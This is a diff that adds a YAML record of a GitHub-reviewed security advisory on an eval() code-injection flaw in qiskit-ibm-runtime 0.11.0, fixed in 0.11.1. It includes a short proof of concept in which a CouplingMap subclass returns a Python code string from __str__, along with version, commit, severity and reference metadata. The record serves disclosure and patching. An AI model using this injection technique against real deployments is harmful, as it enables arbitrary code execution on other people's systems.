@@ -1,0 +1,97 @@
+advisory_id: GHSA-cq96-9974-v8hm
+datasource_id: github_osv/GHSA-cq96-9974-v8hm
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-cq96-9974-v8hm/GHSA-cq96-9974-v8hm.json
+aliases: []
+summary: |
+  Dynamic Variable Evaluation in qiskit-ibm-runtime
+  ### Summary
+
+  An `eval()` method exists `Options._get_program_inputs`. This is bad in any case, but especially bad because `Options` are also used server side, so this has the potential to expose arbitrary code injection in runtime containers, now or at a later time.
+
+  ### Details
+
+  https://github.com/Qiskit/qiskit-ibm-runtime/blob/da94a42060f1a22e6f306227deb45b70e0075723/qiskit_ibm_runtime/options/options.py#L140
+
+  ### PoC
+  A local exploit would be something like
+
+  ```python
+  from qiskit import transpiler
+
+  class BadActor(transpiler.CouplingMap):
+      def __str__(self):
+          return "print('external code')"
+
+  ```
+
+  Where `print("external code")` can be any arbitrary python code string.
+
+  Then if you did a normal workflow and used a specifically constructed `CouplingMap` subclass like `BadActor` above:
+
+  ```python
+  from qiskit_ibm_runtime import QiskitRuntimeService, Session, Options, Sampler
+  from qiskit import QuantumCircuit
+
+  cmap = BadActor.from_line(42)
+  service = QiskitRuntimeService()
+  options = Options(optimization_level=1)
+  options.simulator = dict(coupling_map=cmap))
+
+  bell = QuantumCircuit(2)
+  bell.h(0)
+  bell.cx(0, 1)
+  bell.measure_all()
+
+  with Session(service=service, backend="ibmq_qasm_simulator") as session:
+      sampler = Sampler(session=session, options=options).run(bell)
+  ```
+
+  This will print `external code`
+
+  ### Impact
+
+  Security vulnerability.
+impacted_packages:
+  - purl: pkg:pypi/qiskit-ibm-runtime
+    affected_versions: vers:pypi/>=0.11.0|<0.11.1
+    fixed_versions: vers:pypi/0.11.1
+    affected_packages:
+      - pkg:pypi/qiskit-ibm-runtime@0.11.0
+    fixed_packages:
+      - pkg:pypi/qiskit-ibm-runtime@0.11.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/qiskit/qiskit-ibm-runtime
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/qiskit/qiskit-ibm-runtime
+        commit: 2e8c8c8df83ba310f52d1651a426bad879e0bd38
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '2.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-cq96-9974-v8hm/GHSA-cq96-9974-v8hm.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-627
+references:
+  - url: https://github.com/Qiskit/qiskit-ibm-runtime
+    reference_type:
+    reference_id:
+  - url: https://github.com/Qiskit/qiskit-ibm-runtime/commit/2e8c8c8df83ba310f52d1651a426bad879e0bd38
+    reference_type:
+    reference_id:
+  - url: https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-cq96-9974-v8hm
+    reference_type:
+    reference_id: GHSA-cq96-9974-v8hm
+exploits: []
